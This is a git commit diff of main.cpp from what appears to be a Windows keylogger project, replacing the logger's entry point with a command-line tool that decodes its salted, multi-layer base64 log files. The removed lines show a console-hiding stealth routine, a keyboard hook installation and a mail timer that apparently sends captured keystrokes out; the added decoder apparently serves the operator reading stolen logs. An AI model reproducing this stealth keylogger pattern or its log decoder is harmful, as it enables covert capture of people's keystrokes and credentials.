7cbb8e9ca410ec30a6c61402e5d49a9d3707556a
rsharma00027 <95408199+rsharma00027@users.noreply.github.com>
2022-07-12 15:32:05 +0530

    Add files via upload

--- main.cpp
+++ main.cpp
@@ -1,39 +1,76 @@
 #include <iostream>
-#include <Windows.h>
-#include "Helper.h"
-#include "KeyConstants.h"
-#include "Base64.h"
-#include "IO.h"
-#include "Timer.h"
-#include "SendMail.h"
-#include "KeybHook.h"
+#include <fstream>
+#include <string>
+#include <vector>
 
-using namespace std;
-void hide();
+const std::string &SALT1 = "LM::TB::BB";
+const std::string &SALT2 = "_:/_77";
+const std::string &SALT3 = "line=boostedC++";
+const std::string &BASE64_CODES = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
 
-int main()
+std::string DecryptB64(std::string s);
+std::string base64_decode(const std::string &s);
+
+int main(int argc, char *argv[])
 {
-	hide(); // set console window to appear for a instant
-	MSG Msg; // msg object to be processed, but actually never is processed
+	if (argc != 3)
+		return std::cout << "Program needs TWO arguments, input and output!" << std::endl, 2;
+	std::string in(argv[1]), out(argv[2]);
+	std::ifstream fi(in);
+	if (!fi)
+		return std::cout << "Cannot read input file '" << in << "'" << std::endl, 3;
+	std::string data;
+	fi >> data; // input into data
+	if (!fi)
+		return std::cout << "Input file '" << in << "' corrupted!" << std::endl, 4;
 
-	IO::MKDir(IO::GetOurPath(true));
+	data = DecryptB64(data);
 
-	InstallHook();
+	std::ofstream fo(out);
+	if (!fo)
+		return std::cout << "Cannot write to output file '" << out << "'" << std::endl, 5;
+	fo << data;
+	std::cout << "Decoding was successful" << std::endl;
 
-	while (GetMessage(&Msg, NULL, 0, 0)) // empties console window
-	{
-		TranslateMessage(&Msg);
-		DispatchMessage(&Msg);
-	}
-
-	MailTimer.Stop();
 	return 0;
 }
 
-void hide()
+std::string base64_decode(const std::string &s)
 {
-	HWND stealth; // window handler used to hide the outputted console window
-	AllocConsole();
-	stealth = FindWindowA("ConsoleWindowClass", NULL);
-	ShowWindow(stealth, 0);
+	std::string ret;
+	std::vector<int> vec(256, -1);
+	for (int i = 0; i < 64; i++)
+		vec[BASE64_CODES[i]] = i;
+	int val = 0, bits = -8;
+	for (const auto &c : s)
+	{
+		if (vec[c] == -1) break;
+		val = (val << 6) + vec[c];
+		bits += 6;
+
+		if (bits >= 0)
+		{
+
+			ret.push_back(char((val >> bits) & 0xFF));
+			bits -= 8;
+		}
+	}
+	return ret;
+}
+
+
+std::string DecryptB64(std::string s)
+{
+	s = s.erase(7, 1);
+	s = s.erase(1, 2);
+	s = base64_decode(s);
+	s = s.substr(SALT2.length() + SALT3.length());
+	s = s.substr(0, s.length() - SALT1.length());
+	s = base64_decode(s);
+	s = s.substr(0, s.length() - SALT1.length());
+	s = s.erase(7, SALT3.length());
+	s = base64_decode(s);
+	s = s.substr(SALT1.length());
+	s = s.substr(0, s.length() - SALT2.length() - SALT3.length());
+	return s;
 }
